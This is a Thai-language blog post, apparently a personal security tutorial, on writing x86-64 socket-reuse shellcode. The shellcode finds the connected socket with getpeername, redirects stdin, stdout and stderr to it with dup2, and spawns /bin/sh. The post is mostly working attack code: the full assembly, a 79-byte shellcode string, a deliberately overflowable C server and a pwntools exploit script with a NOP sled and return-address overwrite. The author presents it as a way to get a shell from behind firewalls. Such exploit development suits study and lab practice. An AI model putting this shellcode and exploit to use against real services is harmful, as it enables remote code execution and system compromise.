+++ 
authors = ["Jusmistic",]
title = "Linux x86-64 Execve with Socket Reuse"
date = "2021-03-21"
description = "เขียน Shellcode ทำ Socket Reuse บน Linux x86-64 ยังไง มาดูกันค้าบ"
+++

ช่วงนี้อ่านเรื่อง Socket Reuse ดูเห็น Material เป็น x86 ซะส่วนใหญ่ ยังไม่เป็น Shellcode ที่เป็น x86-64 เบย (ผมพยายามหาแล้วนะ แต่ไม่เจออ่ะ ใครเจอเม้นบ่กหน่อยดิ)

โดยปกติแล้วเทคนิคนี้ค่อนข้างเก่า ไม่ค่อยเห็นคนใช้แล้ว(ทั้ง Real World และ CTF) ส่วนตัวไม่เคยใช้ เทคนิคนี้มาก่อนเบย ถือโอกาสอ่ะลองทำสักหน่อย อย่างน้อย ๆ ก็ถือว่าหัดเขียน Assembly ขำ ๆ

บอกก่อนว่า Ref ส่วนใหญ่ผมอ่านมาจาก x86 เพื่อดูว่าหลัก ๆ แล้วการทำ Socket reuse ต้องทำอะไรบ้าง แล้วเอามาเขียนใหม่บน x86-64 แค่นั้นเลย ไม่ยาก ซึ่งโครงสร้างหลัก ๆ เอามาจากบทความนี้ขอให้เครดิตไปเต็มผมแค่ก็อปแนวคิดมาเขียนใหม่อ่ะ

[Linux x86 One-Way Shellcode (Socket Reuse)](https://d3fa1t.ninja/2017/09/17/linux-x86-one-way-shellcode-socket-reuse/)

## Socket Reuse คืออะไร?(What)

ผมว่าผมเขียนไม่ค่อยดีอ่ะ ว่าจะเขียนอธิบาย Shellcode เฉย ๆ ไม่ได้จะเขียนทฤษฎี ขี้เกียจเขียนด้วย ไปอ่านเว็บอื่นเถอะ

> ถ้าไม่อยากรู้ก็ข้ามไม่อ่านหัวข้อถัดไปเลยค้าบบ

ปกติแล้วใน Linux เราจะใช้สิ่งที่เรียกว่า File Descriptor (FD) ในการเข้าถึงไฟล์หรือ Input/Output ต่าง ๆ ซึ่งใน Linux เองจะมี FD พื้นฐานหลัก ๆ คือ 

- STDIN ใช้ 0 เป็นค่า reference
- STDOUT ใช้ 1 เป็นค่า reference
- STDERR ใช้ 2 เป็นค่า reference

จากลิสท์ด้านบนจะเห็นว่าจริง ๆ แล้วค่า fd เนี่ยมันก็แค่ค่า int ตัวนึงนี่หว่า โดยปกติถ้าโปรแกรมมันต้องการสร้าง fd เพื่อคุยกับอะไรบางอย่าง(socket/file) มันเริ่มรันจากค่าที่ต่ำที่สุด ซึ่งในที่นี้คือ 3 แล้วก็เพิ่มขึ้นไปเรื่อย ๆ

ถ้าใครเคยเขียนภาษา C ทำพวก Socket Server เวลาเราทำการ Handle การเชื่อมของ Client เราจะรับส่งข้อมูลผ่าน send/recv หรือ read/write เราจะมี fd เพื่อบอกว่าเราจะส่งไปที่ Connection ไหน

ซึ่งการทำ Socket Reuse คือการที่เราจะใช้ fd ที่เราใช้ติดต่อกับ Socket Server ซ้ำเพื่อช่วยในการ Exploit ต่อไป ที่จะทำในวันนี้คือเราจะทำการ Spawn Shell แล้วก็ทำการติดต่อกับ Shell ของเราโดยใช้ fd ที่เราทำการเชื่อมต่อกับ Socket Server


## เมื่อไรและทำไมต้องทำ Socket Reuse (When/Why)

---

ส่วนตัวผมเข้าใจว่า Socket Reuse มันไม่ใช่เทคนิคที่ใช้โจมตีอ่ะ แต่มันเป็นเทคนิคที่ใช้ Bypass Exploit Mitigation อย่างนึงซึ่งหลัก ๆ เลยคือ **Service ที่เราไปโจมตีมันอยู่หลัง Firewall แล้วเราไม่สามารถทำ Bind/Reverse Shell ได้** เราเลยต้องมาใช้ fd ที่เราทำการติดต่อกับ Service นั้นเพื่อติดต่อกับ Shell ของเราแทน

**แค่นี้แหละ**

## **การทำ Socket Reuse(How)**

---

อย่างที่บอกไปตอนต้น Socket Reuse ไม่ใช่เรื่องใหม่ ผมไม่ได้เป็นคนคิด ผมแค่ก็อป Concept มาเขียนใหม่เป็น x86-64 เพราะผมยังไม่เห็นใครทำเฉย ๆ วันหลังถ้ามีคนอยากทำจะได้เอา Shellcode ไปใช้หรือโมได้ง่าย ๆ 

**ขั้นตอนการทำ Socket Reuse มีทั้งหมด 3 ขั้นตอน**

1. หา sockfd โดยใช้ฟังก์ชัน getpeername
2. ใช้ฟังก์ชัน dup2 เพื่อทำให้ fd 0,1,2 เชื่อมกับ sockfd ของเรา
3. เรียก Shell

**1. หา sockfd โดยใช้ฟังก์ชัน getpeername**

เราสามารถใช้ฟังก์ชัน getpeername ในการตรวจสอบว่าเลข fd ที่เราส่งเข้าไปนั้นเป็น fd ของ socket รึเปล่าซึ่งเป็นค่าที่เราต้องการหาเพื่อ reuse

ซึ่งจาก [man](https://man7.org/linux/man-pages/man2/getpeername.2.html) page getpeername ต้องการ Argument ดังเน้

```c
int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
```

หากว่า sockfd ที่เราใส่เข้าไปในฟังก์ชัน getpeername นั้นเป็น fd ของ Socket จริง ๆ ค่าที่ฟังก์ชัน Return กลับมาจะเป็น 0 (ต่อไปผมจะใช้ fd แทน sockfd นะเพราะมันสั้นกว่า ซึ่งจริง ๆ มันคือตัวเดียวกันนั้นแหละ)

ซึ่งถ้าเราจะเรียกผ่าน Syscall เราต้องจัดการ Register ให้มีค่าดังนี้ **เก่งป่ะ? จริง ๆ [แล้วก็อปมาจากนี่จ้า](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)**

- **RAX** = 0x34 ⇒ ค่า Syscall ของ getpeername
- **RDI** = sockfd ⇒ เลข fd ที่เราต้องการ Check
- **RSI** = *addr ⇒ Pointer ไปยังพื้นที่ที่เราต้องการเก็บข้อ Address ที่เกี่ยวกับ fd (16 bytes)
- **RDX** = *addr_len ⇒ Pointer ไปยังขนาดของ *addr

จะเห็น *addr ต้องชี้ไปที่พื้นที่ขนาด 16 bytes ซึ่งใน Shellcode นี้เราจะใช้ Stack ถ้าต้องเอาไปทำ ROP ก็ไปโมกันเองจ้าม

ผมไม่เข้าใจเหมือนกันว่าทำในบทความของ DHAYALAN ถึงใช้ Syscall socketcall(0x66) ทั้ง ๆ ที่ใช้ getpeername เลยก็ได้อ่ะ

1.1 เราทำการเตรียมพวก Argument ต่าง ๆ ก่อนเลยซึ่งจะเขียนได้ประมาณนี้

```
find_fd:
	; Clear Register
	xor rdx, rdx        ; rdx = 0
	mov rdi, rdx        ; rdi = 0
	    
	; rsi = *addr
	push rdx            ; prep stack for *addr
	push rdx            ; prep stack for *addr
	mov rsi, rsp        ; rsi = *addr
	
	; rdx = *addr_len
	mov dl, 16          ; addr_len = 16
	push rdx            ; push addr_len to stack
	mov rdx, rsp        ; rdi = *addr_len
	[...]
```

1.2 ทำการเรียก getpeername ผ่าน Syscall 

```
[...]
	; syscall getpeername
	loop_findfd:
	    ; rdi = sockfc
	    inc rdi             ; inc every time when we loop
	
	    xor rax, rax        ; rax = 0
	    mov al, 0x34        ; rax = 0x34
	    syscall             ; call getpeername
[...]
```

จะเห็นว่ามีการ label เพื่อใช้ในการ Loop ไว้ด้วยโดยจะทำการเพิ่ม rdi ขึ้น 1 ทุกรอบจากคำสั่ง `inc rdi` 

1.3 ทำการตรวจสอบว่าค่า rax นั้นซึ่งเป็นค่าที่มัน Return มาจาก getpeername เป็น 0 มั้ย ถ้าไม่ก็กลับไป loop หา fd ที่ใช่

```
[...]
	test rax, rax       ; if rax !=0 jmp to find_fd
	                        ; else => rdi is sockfd -> dup 
	jne loop_findfd
[...]
```

ซึ่งถ้าเมื่อได้ค่า fd ที่เราตามหา(rax = 0)มันก็จะไม่ jmp แล้วไปทำงานที่คำสั่งต่อไปค้าบ โดยที่ค่า fd จะอยู่ที่ rdi นั้นเองค้าบ

**2. ใช้ฟังก์ชัน dup2 เพื่อทำให้ fd 0,1,2 เชื่อมกับ sockfd ของเรา**

เมื่อเราได้ค่า fd ที่เราต้องการ(ซึ่งตอนนี้อยู่ที่ rdi) สิ่งที่เราต้องทำต่อไปคือใช้งานฟังก์ชัน dup2 เพื่อให้เชื่อม fd ของ socket เรากับ STDIN, STDOUT และ STDERR จะทำให้เราสามารถติดต่อกับ Shell ได้นั้นเอง

ซึ่งจาก [man](https://man7.org/linux/man-pages/man2/dup2.2.html) page dup2 ต้องการ Argument ดังเน้

```c
int dup2(int oldfd, int newfd);
```

ซึ่งถ้าเราจะเรียกผ่าน Syscall เราต้องจัดการ Register ให้มีค่าดังนี้

- **RAX** = 0x21
- **RDI** = sockfd
- **RSI** = 0,1,2

พอมาเขียน Assembly ก็จะได้ประมาณนี้

```c
dup2:
	xor rsi, rsi        ; rsi = 0
	
  loop_dup2:
  mov rax, rsi
  mov al, 0x21        ; rax = 0x21
  syscall             ; call dup2(sockfd, rsi)

  inc rsi
  cmp sil, 0x3        ; if rsi != 3 jmp back to loop_dup2
                      ; else execv spawn shell
  jne loop_dup2
```

 ก็คือ loop ซึ่งค่า sockfd ก็อยู่ที่จาก rdi อยู่แล้วจึงไม่ต้องแก้ทำแค่ Clear ค่า rsi ให้ ทำการ loop เพื่อเพิ่มให้ dup2 ครบทั้ง 0, 1 และ 2 แค่นั้นเอง

ซึ่งตอนนี้เองเนี่ยทำการเชื่อม fd ของเราเข้ากับ STDIN, STDOUT และ STDERR เรียบร้อยมาขั้นตอนสุดท้ายคือการเรียก Shell

**3. เรียก Shell**

ผมเขียนให้เรียก `/bin/sh` ไม่เป็นด้วยความเป็น Script kiddie ขอยาดก็อป Shellcode มาจาก [Shellstorm](http://shell-storm.org/shellcode/files/shellcode-806.php) นะค้าบบ ก็มันมีอยู่แร้วอ่ะ ปัยทำซ้ำตะไม😂

```c
exec_shell:
	xor rax, rax
	mov rbx, 0xFF978CD091969DD1
	neg rbx
	push rbx
	;mov rdi, rsp
	push rsp
	pop rdi
	cdq
	push rdx
	push rdi
	;mov rsi, rsp
	push rsp
	pop rsi
	mov al, 0x3b
	syscall
```

จบแล้วครัพ เมื่อเอามาประกอบร่างกันก็จะได้แบบนี้

```
; Linux x86-64 - Execve ("/bin/sh") Socket Reuse
; Length: 79 bytes
; Date: 21/03/2021
; Author: Puttimate "Jusmistic" Thammasaeng
; Tested on: x86_64 Debian GNU/Linux

; Socket Reuse x86-64
; 1. Finding sockfd using getpeername function.
; 2. Call dup2 sockfd with 0,1 and 2.
; 3. Execute /bin/sh.

; nasm -f elf64 socket_reuse.asm -o socket_reuse
; objdump -d ./socket_reuse |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
; Ref: https://d3fa1t.ninja/2017/09/17/linux-x86-one-way-shellcode-socket-reuse/

find_fd:
    ; 1. Finding sockfd using getpeername function.
    ; int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
    ;   src: https://man7.org/linux/man-pages/man2/getpeername.2.html
    ; getpeername syscall: 0x34 
    ;   rax = 0x34 
    ;   rdi = sockfd
    ;   rsi = *addr
    ;   rdx = *addr_len
    ;   src: https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
    ;   Note:
    ;       sockaddr size is 16 bytes.
    ;   Solution:
    ;       1. Prepare stack for *addr and *addr_len
    ;       2. Call getpeername(sockfd++, ...)
    ;       3. loop until rax eq 0 (if the sockfd is correct rax will eq 0)
    ;       After we found a sockfd IP Address will store at rsi+4.
    ;       You can add an IP checking if you want.

    xor rdx, rdx        ; rdx = 0
    mov rdi, rdx        ; rdi = 0
    
    ; rsi = *addr
    push rdx            ; prep stack for *addr
    push rdx            ; prep stack for *addr
    mov rsi, rsp        ; rsi = *addr

    ; rdx = *addr_len
    mov dl, 16          ; addr_len = 16
    push rdx            ; push addr_len to stack
    mov rdx, rsp        ; rdi = *addr_len

    ; syscall getpeername
    loop_findfd:
    ; rdi = sockfc
    inc rdi             ; inc every loop

    xor rax, rax        ; rax = 0
    mov al, 0x34        ; rax = 0x34
    syscall             ; call getpeername

    test rax, rax       ; if rax !=0 jmp to find_fd
                        ; else => rdi is sockfd -> dup2 
    jne loop_findfd

dup2:
    ; 2. Call dup2 sockfd with 0,1 and 2.
    ; int dup2(int oldfd, int newfd);
    ;   src: https://man7.org/linux/man-pages/man2/dup2.2.html
    ; dup2 syscall number: 0x21
    ;   rax = 0x21
    ;   rdi = sockfd
    ;   rsi = 0,1,2
    ;   src: https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
    ; Solution:
    ;   1. Setup arg for dup2 function.
    ;   2. Call dup2 function.

    xor rsi, rsi        ; rsi = 0

    loop_dup2:
    mov rax, rsi
    mov al, 0x21        ; rax = 0x21
    syscall             ; call dup2(sockfd, rsi)

    inc rsi
    cmp sil, 0x3        ; if rsi != 3 jmp back to loop_dup2
                        ; else execv spawn shell
    jne loop_dup2
    nop
    nop

exec_shell:
    ; 3. Execute /bin/sh.
    ; I don't know how to write shellcode to spawn shell just use the snippet from http://shell-storm.org/shellcode/files/shellcode-806.php .

    xor rax, rax
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    ;mov rdi, rsp
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    ;mov rsi, rsp
    push rsp
    pop rsi
    mov al, 0x3b
    syscall

;
; Python3
;   sc = b"\x48\x31\xd2\x48\x89\xd7\x52\x52\x48\x89\xe6\xb2\x10\x52\x48\x89\xe2\x48\xff\xc7\x48\x31\xc0\xb0\x34\x0f\x05\x48\x85\xc0\x75\xf1\x48\x31\xf6\x48\x89\xf0\xb0\x21\x0f\x05\x48\xff\xc6\x40\x80\xfe\x03\x75\xf0\x48\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
;   Length: 79 bytes
;
```


## มาทดสอบ Shellcode กันดีกว่าค้าบ

ขั้นแรกเลยผมใช้โจทย์จาก DHAYALAN  มาโมอ่ะ เพราะขก เขียนเองจะไดแบบนี้งับ

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>

// src: https://d3fa1t.ninja/2017/09/17/linux-x86-one-way-shellcode-socket-reuse/
// use for testing Socket-reuse shellcode x64

int newsockfd;

void error(const char *msg)
{
    perror(msg);
    exit(1);
}
void greet(int newsockfd){
  int n;
  char Hello[500];
  char buffer[2048];

  sprintf(Hello, "Welcome to my server!Send a message!\nbuffer: %lp\n", &buffer);

  write(newsockfd,Hello,strlen(Hello));

  n = read(newsockfd,buffer,4095);
  if (n < 0) error("ERROR reading from socket");

}
int main(int argc, char *argv[])
{
     int sockfd, portno;
     socklen_t clilen;
     char buffer[4096], reply[5100];
	struct sockaddr sock;
     struct sockaddr_in serv_addr, cli_addr;
     int n;
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0) 
        error("ERROR opening socket");
     bzero((char *) &serv_addr, sizeof(serv_addr));
     portno = 1337;
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_addr.s_addr = INADDR_ANY;
     serv_addr.sin_port = htons(portno);
     if (bind(sockfd, (struct sockaddr *) &serv_addr,
              sizeof(serv_addr)) < 0) 
              error("ERROR on binding");
	printf("\n\n Server socket number is %d\n\n",sockfd);
     listen(sockfd,5);

     clilen = sizeof(cli_addr);
     newsockfd = accept(sockfd, 
                 (struct sockaddr *) &cli_addr, 
                 &clilen);
	printf("\n\n Client socket number is %d\n\n",newsockfd);
     if (newsockfd < 0) 
          error("ERROR on accept");
     while (1) {
        greet(newsockfd);
        }
     close(newsockfd);
     close(sockfd);
     return 0; 
}
```

จากนั้นเราลองเขียน [exploit.py](http://exploit.py) จะได้แบบนี้ค้าบบ

```python
from pwn import *

def exp():
    p = remote("localhost", 1337)

    p.recvuntil(": ")
    client_addr = int(p.recvline()[:-1], 16)
    print(f"Buffer Address: {hex(client_addr)}")
    # p.recvuntil(": ")

    sc = b"\x48\x31\xd2\x48\x89\xd7\x52\x52\x48\x89\xe6\xb2\x10\x52\x48\x89\xe2\x48\xff\xc7\x48\x31\xc0\xb0\x34\x0f\x05\x48\x85\xc0\x75\xf1\x48\x31\xf6\x48\x89\xf0\xb0\x21\x0f\x05\x48\xff\xc6\x40\x80\xfe\x03\x75\xf0\x48\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    buf =b""
    buf += b"\x90"*200
    buf += sc
    buf += b"\x90"*(0xa00-len(buf))
    buf += b"B"*8
    buf += p64(client_addr+150)
    buf += b"D"*20

    p.sendline(buf)

    p.interactive()
exp()
```

เมื่อเราลองทำการ Exploit ก็จะเห็นว่าเราสามารถติดต่อกับ Shell ของเราผ่าน fd ของ socket ที่เราใช้โจมตี โดยที่เมื่อเราจะตรวจสอบดูค่า fd ของ Process โจทย์ของเราจะเห็นว่ามันเชื่อมไปที่ fd ของ Socket เรานั้นเอง

![](https://i.imgur.com/byYFTtX.png)

Code ทั้งหมดอยู่ที่ Gist นี้ค้าบบบ

[Gist](https://gist.github.com/jusmistic/08c1ae03cb1cef85ecfecbec9e4855ce)

สำหรับบทความนี้ก็จบแค่นี้ค้าบ ถ้าสงสัยตรงไหนไปถาม [@Bankie](https://web.facebook.com/bank.eakasit) นะค้าบทักไปได้ 24 hr เบยยย

ขอบคุณที่อ่านจนจบค้าบ ถ้าใครอ่านแล้วงง ๆ ตรงไหนก็สู้ ๆ แล้วกัน(หยอกๆๆ ) ผมอาจเขียนไม่ค่อยดีเท่าไรค้าบเลยงง มีอะไรแนะนำกันได้หรือถ้าผิดตรงไหนก็บอกได้เช่นกันค้าบ ❤

สุดท้ายแล้วก็ฝากไว้ประโยคเดียวค้าบ

> UV ไม่ดีต่อผิว แต่ U so cute ไม่ดีต่อจัยค้าบบบ

**บรัย**

## Reference

---

[Linux x86 One-Way Shellcode. (Socket Reuse)](https://d3fa1t.ninja/2017/09/17/linux-x86-one-way-shellcode-socket-reuse/)

[Linux System Call Table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)

[getpeername(2) - Linux manual page](https://man7.org/linux/man-pages/man2/getpeername.2.html)

[dup(2) - Linux manual page](https://man7.org/linux/man-pages/man2/dup2.2.html)

[Linux/x86-64 - Execute /bin/sh - 27 bytes](http://shell-storm.org/shellcode/files/shellcode-806.php)

[Bank Eakasit](https://web.facebook.com/bank.eakasit)